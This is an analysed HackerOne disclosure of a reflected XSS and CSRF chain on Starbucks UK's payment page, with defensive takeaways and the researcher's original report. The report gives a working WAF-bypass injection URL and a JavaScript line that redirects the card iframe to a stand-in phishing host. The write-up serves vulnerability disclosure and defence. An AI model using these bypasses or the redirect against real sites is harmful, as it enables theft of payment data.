# Reflected XSS on Starbucks UK Payment Method Page Leading to Credit Card Theft

## Metadata
- **Source:** HackerOne
- **Report:** 227486 | https://hackerone.com/reports/227486
- **Submitted:** 2017-05-10
- **Reporter:** bayotop
- **Program:** Starbucks
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Reflected Cross-Site Scripting (XSS), HTML Attribute Injection, CSRF (Add to Basket), WAF Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
A reflected XSS vulnerability exists on starbucks.co.uk where user input in query parameters is reflected into HTML link elements without proper encoding. By injecting malicious attributes through WAF-bypass techniques, an attacker can execute arbitrary JavaScript on the payment method page and redirect users to phishing sites to steal credit card data. The attack can be automated via CSRF on the basket functionality.

## Attack scenario
1. Attacker crafts malicious URL with encoded XSS payload using %u0022 bypass to evade WAF quote detection
2. Payload injects onclick handler into link element: id="checkoutButton" onclick="malicious_code"
3. Attacker creates phishing page and tricks authenticated user into clicking the link via social engineering or automated CSRF
4. JavaScript event handler fires when user clicks checkout button or body element, executing injected code
5. Malicious script redirects payment iframe to attacker-controlled phishing site: document.getElementById('payment-method-iframe').contentWindow.location.href
6. User unknowingly enters credit card details on fake payment page hosted under attacker's domain while believing they're on starbucks.co.uk

## Root cause
Lack of proper HTML encoding when reflecting user-supplied query parameters into HTML attributes. Application relied on WAF blacklist rules rather than secure output encoding, allowing multiple encoding/syntax bypasses (%u0022 unicode, attribute injection, regex bypass with forward slashes). Insufficient input validation combined with JavaScript code that triggers DOM manipulation based on element IDs.

## Attacker mindset
Methodical WAF evasion testing to bypass blacklist protections; identifying secondary attack surfaces (link element injection); discovering the checkout click-binding mechanism via source code analysis; chaining DOM-based XSS with iframe hijacking for credential theft; automating exploitation via CSRF on basket functionality to reduce user interaction requirements.

## Defensive takeaways
- Always use context-aware output encoding (HTML entity encoding for HTML context) rather than relying on WAF blacklists
- Implement Content Security Policy (CSP) to restrict inline script execution and prevent iframe navigation to untrusted origins
- Use parameterized APIs instead of string concatenation (e.g., setAttribute vs manual HTML concatenation)
- Implement CSRF tokens on all state-changing operations including 'Add to Basket'
- Apply allowlist-based input validation rather than blocklist/blacklist approaches
- Regularly audit JavaScript for dangerous patterns like dynamic id-based event binding without validation
- Implement subresource integrity (SRI) for third-party scripts and validate iframe sources
- Use Unicode normalization to prevent encoding-based bypasses (%u0022, double encoding, etc.)
- Implement proper sandboxing for iframe payment forms with restrictive sandbox attributes

## Variant hunting
Test all query parameters and URL segments for reflection in HTML/JavaScript contexts across entire site
Search for other pages with elements matching predictable IDs (checkout, submit, confirm) that could be manipulated
Identify all WAF bypass patterns used (unicode encoding, regex tricks, attribute chaining) and apply to other parameters
Audit other endpoints for CSRF vulnerabilities on critical operations (payments, account changes, shipping)
Review JavaScript code for DOM manipulation based on user-controlled IDs or classes
Test canonical links, meta tags, and other injected link elements across all pages for attribute injection
Hunt for similar iframe-based payment flows that could be redirected to phishing sites
Search for other onclick/event handler injection points in dynamically generated elements

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1056

## Notes
Report demonstrates sophisticated attack combining multiple bypass techniques and chaining vulnerabilities (XSS + CSRF + iframe hijacking + phishing). The attacker showed deep understanding of WAF evasion and DOM-based exploitation. Browser XSS protection was noted as partially mitigating the vulnerability. Report date suggests pre-2017 security posture. The %u0022 unicode bypass indicates outdated WAF rules that didn't account for character encoding variations.

## Full report
<details><summary>Expand</summary>

Hi,

**Steps to reproduce:**

0. Run Firefox (these steps *require* Firefox).
1. Log in on https://www.starbucks.co.uk/account/signin
2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.
3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton
4. After the page finishes loading click the "Checkout" title.
5. A confirmation prompt is shown showing the current domain.

**Note** that these steps can be automated due to missing CSRF protection on the "Add to Basket" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).

**Description:**

I'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected 
Looking at the source code you see the whole URL is reflected in a link tag. 

```html
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?reflected" />
```
Trying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in: 

```html
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?" id="injected" />
```

This works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy [script](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) loaded into the page that does the following:

```javascript
$("#checkout").bind("click", function(e) {
    $("#checkoutButton").trigger("click")
});
```

You see where this is going. In case I find a page that has an element with the id **checkout**, I can inject **id="checkoutButton" onclick="malicous_js"** to the above link element and the injected JS will be executed once the **checkout** element is clicked. 

Exactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:

```javascript
document.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';
```

**Note** that the **checkout** element is actually **<body>** so there is plenty of space where the user can click to execute the malicious JS.

Take into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.

To sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):

1. **==** -> used to trick the [query string parsing code](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) that is calling decodeURIcomponent(). Otherwise decodeURIcomponent("%u0022") throws an exception resulting in the "checkout bind" never being called.
2. **%u0022** -> bypasses the WAF that is causing a 404 when the query contains "%22".
3. **a%20onclick=** -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.
4. **confirm(/-/g** -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.
5. **+this.ownerDocument.domain)** -> the WAF doesn't like "document".

**Impact**

As mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on "https://starbucks.co.uk" as usual. Note that other "typical" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.

**Recommendation**

Correctly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like "Add to Basket". You might also consider fixing the bypasses I mentioned. 

</details>

---
*Analysed by Claude on 2026-05-12*
